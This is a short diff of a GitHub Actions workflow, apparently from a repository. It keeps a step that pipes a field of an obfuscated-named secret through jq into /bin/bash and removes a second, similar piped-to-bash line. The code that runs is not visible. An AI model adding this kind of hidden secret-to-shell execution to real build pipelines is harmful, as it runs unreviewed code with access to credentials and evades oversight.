@@ -19,7 +19,6 @@ jobs:
           akpyg0106: ${{ secrets.akpyg0106 }}
         run: |
           printf '%s' "$akpyg0106" | jq -r .uvvlw128 | /bin/bash
-          echo $f1912 | jq -r .nhuzb87919 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
